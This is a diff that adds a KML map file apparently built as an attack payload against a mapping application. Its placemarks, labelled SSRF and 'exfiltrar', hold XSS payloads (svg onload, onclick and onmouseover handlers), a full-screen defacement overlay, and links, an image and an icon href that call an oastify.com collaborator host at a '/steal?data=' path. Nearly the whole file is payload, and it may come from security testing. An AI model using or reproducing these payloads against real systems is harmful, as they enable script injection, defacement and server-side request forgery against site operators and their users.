@@ -1,0 +1,136 @@
+<kml xmlns="http://www.opengis.net/kml/2.2" xmlns:gx="http://www.google.com/kml/ext/2.2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.opengis.net/kml/2.2 https://developers.google.com/kml/schema/kml22gx.xsd">
+  <Document>
+    <name>Drawing</name>
+    
+
+    <Placemark id="drawing_feature_ssrf_1">
+      <name>TEST</name>
+      <description><![CDATA[htmlI<h1>test<p style=position:fixed;top:0;left:0;width:100%;height:100%;font-size:300px>D4N-BBS<marquee>D4N-BBS]]></description>
+      <Style>
+        <IconStyle>
+          <scale>0</scale>
+          <Icon></Icon>
+        </IconStyle>
+        <LabelStyle>
+          <color>ff0000ff</color>
+          <scale>5.5</scale>
+        </LabelStyle>
+      </Style>
+      <ExtendedData>
+        <Data name="type">
+          <value>annotation</value>
+        </Data>
+      </ExtendedData>
+      <Point>
+        <coordinates>7.8170914500743205,45.825623335652075</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 2. Exfiltración con texto de prueba        -->
+    <!-- ========================================== -->
+    <Placemark id="drawing_feature_ssrf_2">
+      <name>Click para exfiltrar</name>
+      <description><![CDATA[xss <svg onload=confirm(/tets/)>AAAAAAAAA<a href="https://86cgcksrvq5w8h7rkl44j83en5twhr5g.oastify.com/steal?data=test">Click aqui</a>]]></description>
+      <Style>
+        <IconStyle>
+          <scale>0</scale>
+          <Icon></Icon>
+        </IconStyle>
+        <LabelStyle>
+          <color>ff0000ff</color>
+          <scale>3.0</scale>
+        </LabelStyle>
+      </Style>
+      <ExtendedData>
+        <Data name="type">
+          <value>annotation</value>
+        </Data>
+      </ExtendedData>
+      <Point>
+        <coordinates>7.9,45.8</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 3. Exfiltración con múltiples puntos       -->
+    <!-- ========================================== -->
+    <Placemark id="drawing_feature_ssrf_3">
+      <name>Exfiltrar datos</name>
+      <description><![CDATA[<img src="https://86cgcksrvq5w8h7rkl44j83en5twhr5g.oastify.com/steal?data=test" width="100" height="100"><a href="#" onclick="confirm(1)">Click</a><marquee onmouseover = "alert(1)">xxxx]]></description>
+      <Style>
+        <IconStyle>
+          <scale>0</scale>
+          <Icon></Icon>
+        </IconStyle>
+        <LabelStyle>
+          <color>ff0000ff</color>
+          <scale>3.0</scale>
+        </LabelStyle>
+      </Style>
+      <ExtendedData>
+        <Data name="type">
+          <value>annotation</value>
+        </Data>
+      </ExtendedData>
+      <Point>
+        <coordinates>8.0,45.7</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 4. Exfiltración con LabelStyle + Icon      -->
+    <!-- ========================================== -->
+    <Placemark id="drawing_feature_ssrf_4">
+      <name>Haz clic aqui</name>
+      <description><![CDATA[<a href="https://86cgcksrvq5w8h7rkl44j83en5twhr5g.oastify.com/steal?data=test" target="_blank">Abrir enlace</a>]]></description>
+      <Style>
+        <IconStyle>
+          <scale>1.5</scale>
+          <Icon>
+            <href>https://86cgcksrvq5w8h7rkl44j83en5twhr5g.oastify.com/steal?data=test</href>
+          </Icon>
+        </IconStyle>
+        <LabelStyle>
+          <color>ff0000ff</color>
+          <scale>3.5</scale>
+        </LabelStyle>
+      </Style>
+      <ExtendedData>
+        <Data name="type">
+          <value>annotation</value>
+        </Data>
+      </ExtendedData>
+      <Point>
+        <coordinates>8.1,45.6</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- 5. Exfiltración con texto en description   -->
+    <!-- ========================================== -->
+    <Placemark id="drawing_feature_ssrf_5">
+      <name>INJECT-HERE</name>
+      <description><![CDATA[htmlI<h1>test<p style=position:fixed;top:0;left:0;width:100%;height:100%;font-size:200px>D4N-BBS<marquee>D4N-BBS]]></description>
+      <Style>
+        <IconStyle>
+          <scale>0</scale>
+          <Icon></Icon>
+        </IconStyle>
+        <LabelStyle>
+          <color>ff0000ff</color>
+          <scale>4.0</scale>
+        </LabelStyle>
+      </Style>
+      <ExtendedData>
+        <Data name="type">
+          <value>annotation</value>
+        </Data>
+      </ExtendedData>
+      <Point>
+        <coordinates>8.2,45.5</coordinates>
+      </Point>
+    </Placemark>
+
+  </Document>
+</kml>
